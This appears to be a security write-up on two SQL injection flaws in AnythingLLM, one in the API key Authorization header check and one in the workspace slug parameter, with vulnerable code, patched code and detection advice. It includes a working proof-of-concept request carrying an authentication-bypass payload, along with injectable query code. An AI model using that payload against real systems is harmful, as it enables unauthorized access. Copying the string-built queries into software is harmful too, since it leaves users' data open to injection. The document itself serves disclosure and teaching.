


# Overview

This vulnerability was reported by [vxhid](https://huntr.com/users/vvxhid)

Source link for the reported vulnerabilities are as follows:
* https://huntr.com/bounties/70a2fb18-f030-4abb-9ddc-13f94107ac9d/ - SQL Injection Vulnerability due to Insecure Processing of Authorization Header
* https://huntr.com/bounties/70a2fb18-f030-4abb-9ddc-13f94107ac9d/ - SQL Injection Vulnerability due to Improper sanitization of `slug` parameter

[Link to "How to Identify Similar vulnerabilities"](#how-to-identify-similar-vulnerabilities)

### Insecure Processing of Authorization Header Token


> The validApiKey middleware, which is responsible for verifying API keys provided in the request's Authorization header, is susceptible to SQL injection. This vulnerability can potentially lead to an authentication bypass, granting unauthorized access to API endpoints.

Aside from the fact that the severity is critical here due to the impact of the SQL injection attack, this vulnerability arises as the application is designed to fetch the Authorization header value and doing a quick lookup in the database to see if that particular token exists or not. Due to lack of proper sanitization as this value could be attacker controlled, it was possible to leverage it for performing SQL Injection.
As mentioned in the report, the affected file was [](https://github.com/Mintplex-Labs/anything-llm/blob/master/server/utils/middleware/validApiKey.js#L17) which is as follows:

```ts
const { ApiKey } = require("../../models/apiKeys");
const { SystemSettings } = require("../../models/systemSettings");

async function validApiKey(request, response, next) {
  const multiUserMode = await SystemSettings.isMultiUserMode();
  response.locals.multiUserMode = multiUserMode;

  const auth = request.header("Authorization");
  const bearerKey = auth ? auth.split(" ")[1] : null;
  if (!bearerKey) {
    response.status(403).json({
      error: "No valid api key found.",
    });
    return;
  }

  if (!(await ApiKey.get({ secret: bearerKey }))) {
    response.status(403).json({
      error: "No valid api key found.",
    });
    return;
  }

  next();
}

module.exports = {
  validApiKey,
};
```

As you can see, it extracts the "Authorization" header value by splitting it with the whitespace delimeter and then using the second index value which will be the token i.e. `bearerKey` which is later passed to `ApiKey.get` which is a method to retrieve the key from the database by preparing a SELECT statement passing the `clause` which will contain the user-supplied input, in this case a payload.

```ts
  get: async function (clause = "") {
    const db = await this.db();
    const result = await db
      .get(
        `SELECT * FROM ${this.tablename} ${clause ? `WHERE ${clause}` : clause}`
      )
      .then((res) => res || null);
    if (!result) return null;
    db.close();
    return { ...result };
  }
```

### Proof of Concept

How we can say something is vulnerable without the proof-of-concept? Apparently, I was having trouble setting up the vulnerable version of the application even with the docker so I am going to reference it from the report itself:

```py
import requests

url = "http://localhost:3001/api/v1/system"

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Referer": "http://localhost:3000/",
    "Connection": "close",
    "Authorization": "Bearer not_valid_api_key'OR(1)=(1);--", # Injection here
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "If-None-Match": "W/\"773-MdgLun6ESFXPFk/WGHQAe92jMuI\"",
}

response = requests.get(url, headers=headers)

print(response.text)
```

Here, as you can see the value of the "Authorization" header is `Bearer not_valid_api_key'OR(1)=(1);--`, now according to what we saw the data process will happen eventually taking the value `not_valid_api_key'OR(1)=(1);--` which will be passed to the key retrieval function insecurely resulting in SQL Injection.

##### Fix

This was fixed by the maintainer of the repository made a commit escaping quotes which may lead to any potential harm by using `escape` function of [sqlstring](https://www.npmjs.com/package/sqlstring) package.

The patched code:

```ts
const { escape } = require("sqlstring-sqlite");
const { ApiKey } = require("../../models/apiKeys");
const { SystemSettings } = require("../../models/systemSettings");

async function validApiKey(request, response, next) {
  const multiUserMode = await SystemSettings.isMultiUserMode();
  response.locals.multiUserMode = multiUserMode;

  const auth = request.header("Authorization");
  const bearerKey = auth ? auth.split(" ")[1] : null;
  if (!bearerKey) {
    response.status(403).json({
      error: "No valid api key found.",
    });
    return;
  }

  if (!(await ApiKey.get(`secret = ${escape(bearerKey)}`))) {
    response.status(403).json({
      error: "No valid api key found.",
    });
    return;
  }

  next();
}

module.exports = {
  validApiKey,
};
```

Additionally, they started making use of `prisma` for passing parameterized query elimiating the possibilities of any SQL Injection during the preparation of the SQL statement:
```ts
  get: async function (clause = {}) {
    try {
      const apiKey = await prisma.api_keys.findFirst({ where: clause });
      return apiKey;
    } catch (error) {
      console.error("FAILED TO GET API KEY.", error.message);
      return null;
    }
  },
```

---


There was another instance of SQL Injection vulnerability reported by the same author in which the application takes a `slug` implict parameter as part of URL which was passed to a SQL query without proper sanitization. The vulnerability occures due to no sanitization on user supplied inputs and later passed to SQL query.

> The /api/workspace/:slug endpoint exposes a critical SQL injection vulnerability in the slug parameter. This vulnerability arises due to the insecure handling of user-supplied data (slug) in the construction of a SQL query. An attacker can exploit this vulnerability by crafting a malicious slug value that includes SQL injection payloads. When the manipulated slug is incorporated into the SQL query, it can alter the query's behavior. This malicious activity may lead to unauthorized access to the database, unauthorized data retrieval, data manipulation, and potentially full control of the database server.

The description given by the author is self-explanatory, checking the code where these `slug` parameters are passed

```ts
  app.get("/workspace/:slug", [validatedRequest], async (request, response) => {
    try {
      const { slug } = request.params;
      const user = await userFromSession(request, response);
      const workspace = multiUserMode(response)
        ? await Workspace.getWithUser(user, { slug })
        : await Workspace.get({ slug });

      response.status(200).json({ workspace });
    } catch (e) {
      console.log(e.message, e);
      response.sendStatus(500).end();
    }
```

Most of the workspace methods make a call to the `get` and `getWithUser` where the user-supplied parameter is passed, as it can be seen below, the `getWithUser` method takes the `clause` parameter which is the user-input in this case and can be seen that it is passed to a SQL query without sanitization


```ts
  getWithUser: async function (user = null, clause = "") {
    if (user.role === "admin") return this.get(clause);

    const db = await this.db();
    const result = await db
      .get(
        `SELECT * FROM ${this.tablename} as workspace 
      LEFT JOIN workspace_users as ws_users 
      ON ws_users.workspace_id = workspace.id 
      WHERE ws_users.user_id = ${user?.id} AND ${clause}`
      )
      .then((res) => res || null);
    if (!result) return null;
    db.close();

    const workspace = { ...result, id: result.workspace_id };
    const documents = await Document.forWorkspace(workspace.id);
    return { ...workspace, documents };
  },
  get: async function (clause = "") {
    const db = await this.db();
    const result = await db
      .get(`SELECT * FROM ${this.tablename} WHERE ${clause}`)
      .then((res) => res || null);
    if (!result) return null;
    db.close();

    const documents = await Document.forWorkspace(result.id);
    return { ...result, documents };
  },
```


##### Fix

The fix which is implemented by the maintainer is a good patch as it made use of the previously mentioned function to sanitize the input and also have implemented `prisma` for performing parameterized queries on the database, effectively elimiating chance of modifying queries.

```ts
  getWithUser: async function (user = null, clause = {}) {
    if (user.role === "admin") return this.get(clause);

    try {
      const workspace = await prisma.workspaces.findFirst({
        where: {
          ...clause,
          workspace_users: {
            some: {
              user_id: user?.id,
            },
          },
        },
        include: {
          workspace_users: true,
          documents: true,
        },
      });

      if (!workspace) return null;

      return {
        ...workspace,
        documents: await Document.forWorkspace(workspace.id),
      };
    } catch (error) {
      console.error(error.message);
      return null;
    }
  },

  get: async function (clause = {}) {
    try {
      const workspace = await prisma.workspaces.findFirst({
        where: clause,
        include: {
          documents: true,
        },
      });

      return workspace || null;
    } catch (error) {
      console.error(error.message);
      return null;
    }
  },
```


---

### How to Identify Similar vulnerabilities {#how-to-identify-similar-vulnerabilities}

Considering how the author has identified these vulnerabilities, it can be brought down to two things:
* Identifying the user-supplied inputs and how they are processed
* Understanding the communication between the server and database

It is not something exclusive but in order to identify such vulnerabilities, it can be approached in a manner where you can identify the possible dynamic values in the application or user inputs and how they're being processed. Considering the size of the application, it would be a problem to look into the sink of the user inputs, making use of tools like CodeQL will provide a big help. 
On the same note, one important thing here is that it should be a must to look into the data processing part of any application that could potentially be modified to perform any unexpected operation.